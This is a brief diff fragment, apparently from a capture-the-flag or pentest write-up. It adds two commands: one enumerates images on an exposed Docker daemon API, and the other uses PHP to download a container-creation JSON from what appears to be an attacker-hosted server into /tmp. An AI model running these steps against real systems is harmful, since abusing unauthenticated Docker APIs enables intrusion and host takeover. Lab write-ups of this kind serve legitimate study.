@@ -124,3 +124,6 @@ if r.json:
         print(r)
 ```
 
+curl -s http://192.168.65.7:2375/images/json
+
+php -r "copy('http://10.10.14.116:8000/create_container.json', '/tmp/create_container.json');"
